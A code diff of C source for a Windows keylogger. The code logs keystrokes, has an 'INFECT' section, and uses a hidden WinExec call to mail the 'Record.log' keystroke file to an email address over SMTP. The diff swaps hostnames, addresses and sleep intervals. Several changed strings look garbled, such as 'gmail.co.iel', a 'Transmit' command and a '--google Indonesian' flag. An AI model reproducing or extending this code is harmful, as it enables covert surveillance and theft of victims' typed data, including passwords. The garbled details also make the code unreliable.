@@ -49,7 +49,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping https://polri.go.id -n 1")){ ///check connection
+            if(!system("ping https://www.google.ie -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -76,7 +76,7 @@ main(){
         if(age <= LIFE_TIME){
             logKey();
         }else{
-            Sleep(5000);
+            Sleep(500000000);
         }
 
         ////////////****INFECT****////////////
@@ -139,7 +139,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.co.id -v --mail-from \"your.email@gmail.co.id\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --google Indonesian ";
+    char* command = "Transmit smtp://smtp.gmail.co.au -v --mail-from \"your.email@gmail.co.iel\" --mail-rcpt \"your.email@gmail.co.id\" --ssl -u your.email@gmail.com.sg:password -T \"Record.log\" -k --google Indonesian ";
     WinExec(command, SW_HIDE);
 }
 
